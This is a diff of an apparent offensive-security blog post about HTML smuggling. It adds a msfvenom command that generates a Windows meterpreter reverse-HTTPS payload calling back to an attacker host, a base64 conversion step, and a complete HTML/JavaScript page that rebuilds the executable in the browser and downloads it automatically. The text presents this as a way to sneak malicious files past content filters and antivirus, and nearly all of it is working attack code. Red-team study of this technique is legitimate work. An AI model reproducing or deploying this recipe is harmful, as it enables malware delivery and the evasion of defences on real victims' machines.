@@ -6,16 +6,28 @@ date: 2025-05-19 08:00:00 -0600                           # Change the date to m
 categories: [22 Evasion Techniques, HTML Smuggling]          # Change Templates to Writeup
 tags: [evasion, html smuggling]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
 show_image_post: false                                    # Change this to true
-#image: /assets/img/icons/Destroyercms.png                # Add infocard image here for post preview image
+#image: /assets/img/machine-0-infocard.png          # Add infocard image here for post preview image
 ---
 
-This technique leverages the HTML5 anchor tag download attribute, which instructs the browser to automatically download a file when a user clicks the assigned hyperlink.
+Using a combination of HTML5 and JavaScript to sneak malicious files past content filters is not a new offensive technique. This mechanism has been incorporated into popular offensive frameworks such as Demiguise and SharpShooter for example.
 
+HTML smuggling is a file delivery technique that leverages HTML5 and JavaScript to build a file directly in the browser — rather than downloading it from a remote server — and then triggers a download, often without triggering network-based antivirus or proxy protections.
+
+Generate a payload with msfvenom:
 ```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<your_ip> LPORT=443 -f exe -o payload.exe
+```
+
+Convert to Base64:
+```bash
+base64 payload.exe | tr -d '\n'
+```
+
+Then stick your payload to this Javascript/HTML page:
+```html
 <html>
   <body>
     <script>
-      // Convert Base64 string to ArrayBuffer
       function base64ToArrayBuffer(base64) {
         var binary_string = window.atob(base64);
         var len = binary_string.length;
@@ -26,26 +38,30 @@ This technique leverages the HTML5 anchor tag download attribute, which instruct
         return bytes.buffer;
       }
 
-      // Insert your Base64-encoded EXE below (single line, no newlines)
-      var file = '<BASE64_STRING>';
+      // === Base64 payload here (one-line string) ===
+      var file = '<BASE64_PAYLOAD>'; 
 
-      // Convert to ArrayBuffer and create Blob
       var data = base64ToArrayBuffer(file);
       var blob = new Blob([data], { type: 'application/octet-stream' });
       var fileName = 'msfstaged.exe';
 
-      // Create invisible link and trigger download
-      var a = document.createElement('a');
-      document.body.appendChild(a);
-      a.style = 'display: none';
-      var url = window.URL.createObjectURL(blob);
-      a.href = url;
-      a.download = fileName;
-      a.click();
-
-      // Revoke URL to clean up
-      window.URL.revokeObjectURL(url);
+      // === Cross-browser download logic ===
+      if (window.navigator && window.navigator.msSaveOrOpenBlob) {
+        // For Internet Explorer and older Edge
+        window.navigator.msSaveOrOpenBlob(blob, fileName);
+      } else {
+        // For modern browsers (Chrome, Firefox, new Edge)
+        var a = document.createElement('a');
+        var url = window.URL.createObjectURL(blob);
+        a.style = 'display: none';
+        a.href = url;
+        a.download = fileName;
+        document.body.appendChild(a);
+        a.click();
+        window.URL.revokeObjectURL(url);
+      }
     </script>
   </body>
 </html>
+
 ```
